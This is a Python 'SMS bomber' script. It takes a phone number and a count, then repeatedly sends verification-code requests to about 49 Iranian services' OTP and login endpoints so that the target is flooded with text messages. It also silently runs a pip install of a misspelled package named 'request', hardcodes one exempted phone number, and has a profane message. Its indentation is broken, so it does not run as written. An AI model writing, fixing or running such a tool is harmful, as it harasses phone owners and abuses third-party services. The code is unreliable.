import os
os.system("pip install request")
from requests import post, get

esfelurm = input("Number")
NUmb = int(input("Number of sms : "))


Api = {"phone":esfelurm}

if esfelurm != "09024986422":
    for i in range(int(NUmb)):
    try:
        api = post ('https://api.divar.ir/v5/auth/authenticate', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api2 = post ('https://messengerg2c42.iranlms.ir/', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api3 = post ('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api4 = post ('https://web.emtiyaz.app/json/login', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api5 = post ('https://bama.ir/signin-checkforcellnumber', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api6 = post ('https://ws.alibaba.ir/api/v3/account/mobile/otp', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api7 = post ('https://api.chartex.net/api/v2/user/validate', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api8 = post ('https://www.digikala.com/ajax/users/login-with-otp/send-confirm-code/', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api9 = post ('https://drdr.ir/api/registerEnrollment/verifyMobile', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api10 = post ('https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api11 = post ('https://core.gapfilm.ir/api/v3.1/Account/Login', json=Api)
        print (f"Sent")
    except:
        print (f" No sent")
    try:
        api12 = post ('https://app.espard.com/api/v1/auth/identify-by-mobile', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api13 = post ('https://a4baz.com/api/web/login', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api14 = post ('https://taraazws.jabama.com/api/v4/account/send-code', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api15 = post ('https://www.tebinja.com/api/v1/users', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api16 = post ('https://api2.anten.ir/users', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api17 = post ('https://api.doctoreto.com/api/web/patient/v1/accounts/register', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api18 = post ('https://next.zarinpal.com/api/oauth/initialize', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api19 = post ('https://api.mobit.ir/api/web/v8/register/register', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api20 = post ('https://dayanshop.com/Auth/CheckPhoneNumber', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api21 = post ('https://api-react.okala.com/C/CustomerAccount/OTPRegister', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api22 = post ('https://restcore.bimeh.com/v1/authentication', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api23 = post ('https://diginext.ir/register/send-sms', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api24 = post ('https://api.digikalajet.ir/user/login-register/', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api25 = post ('https://app.mydigipay.com/digipay/api/users/send-sms', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api26 = post ('https://app.itoll.ir/api/v1/auth/login', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api27 = post ('https://mobapi.banimode.com/api/v2/auth/request', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api28 = post ('https://tj8.ir/auth/register', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api29 = post ('https://mamifood.org/Registration.aspx/IsUserAvailable', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api30 = post ('https://restaurant.delino.com/user/register', json=Api)
        print (f"Sent")
    except:
        print (f" No sent")
    try:
        api31 = post ('https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api32 = post ('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api33 = post ('https://virgool.io/api/v1.4/auth/verify', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api34 = post ('https://www.sheypoor.com/api/v10.0.0/auth/send', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api35 = get (f'https://api.binjo.ir/api/panel/get_code/{esfelurm}')
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api36 = get (f'https://core.gap.im/v1/user/add.json?mobile={esfelurm}')
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api37 = get (f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{esfelurm}')
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api38 = get (f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{esfelurm}/sms?cCode=')
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api39 = get (f'https://etma.ir/fa/Account/IsExistUserName?userName={esfelurm}')
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api40 = get (f'https://api.digighate.com/user/code?phone={esfelurm}')
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api41 = get (f'https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail={esfelurm}&source=2&sendTokenIfNot=true')
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api42 = get (f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{esfelurm}/sms?cCode=+98')
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api43 = get (f'https://behandam.kermany.com/fitamin-central-service/api/fitamin/v2/register/status?mobile={esfelurm}')
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api44 = get (f'https://filmnet.ir/api-v2/access-token/users/{esfelurm}/otp')
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api45 = post ('https://api.tapsi.cab/api/v2.2/user', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api46 = post ('https://api.pinwork.co/api/v1/customer/verification', json=Api)
        print (f"Sent")
    except:
        print (f"No sent")
    try:
        api47 = post ('https://core.gapfilm.ir/api/v3.1/Account/Login', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api48 = post ('https://accounts.inoor.ir/api/v1.0/register/chooseway', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
    try:
        api49 = post ('https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one', json=Api)
        print (f" Sent")
    except:
        print (f" No sent")
else:
    print("fuck you bach!!")
